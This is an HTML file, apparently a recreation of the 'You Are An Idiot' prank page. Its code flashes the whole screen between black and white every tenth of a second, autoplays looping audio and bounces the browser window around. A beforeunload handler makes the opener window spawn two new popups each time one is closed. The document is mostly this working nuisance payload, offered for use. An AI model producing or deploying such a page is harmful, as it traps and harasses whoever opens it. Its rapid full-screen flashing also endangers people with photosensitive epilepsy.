<!DOCTYPE html>
<html>
<head>
<style>
* { margin: 0; padding: 0; }
body { overflow: hidden; }
#p {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
    animation: bg 0.1s infinite alternate;
}
@keyframes bg { from { background: white; } to { background: black; } }
#t { font-family: Arial; font-size: 20px; font-weight: bold; animation: col 0.1s infinite alternate; }
@keyframes col { from { color: red; } to { color: blue; } }
.f { font-size: 32px; animation: fl 0.1s infinite alternate; }
@keyframes fl { from { filter: invert(0); } to { filter: invert(1); } }
</style>
</head>
<body>
<div id="p">
    <div id="t">YOU ARE AN IDIOT!</div>
    <div><span class="f">&#9786;</span> <span class="f">&#9786;</span> <span class="f">&#9786;</span></div>
</div>
<audio autoplay loop src="yai.wav"></audio>
<script>
// rebota por la pantalla como el original
var xOff = 5, yOff = 5;
var xPos = Math.floor(Math.random()*600);
var yPos = Math.floor(Math.random()*400);

function playBall() {
    xPos += xOff;
    yPos += yOff;
    if (xPos > screen.width - 250) { xOff = -(Math.ceil(Math.random()*6)*5); }
    if (xPos < 0) { xOff = Math.ceil(Math.random()*6)*5; }
    if (yPos > screen.height - 200) { yOff = -(Math.ceil(Math.random()*6)*5); }
    if (yPos < 0) { yOff = Math.ceil(Math.random()*6)*5; }
    window.moveTo(xPos, yPos);
    setTimeout(playBall, 10);
}

playBall();

// si cierran este popup — abre dos mas desde el opener
window.addEventListener('beforeunload', function() {
    try {
        if (window.opener && !window.opener.closed) {
            window.opener.openPopup();
            window.opener.openPopup();
        }
    } catch(e) {}
});
</script>
</body>
</html>
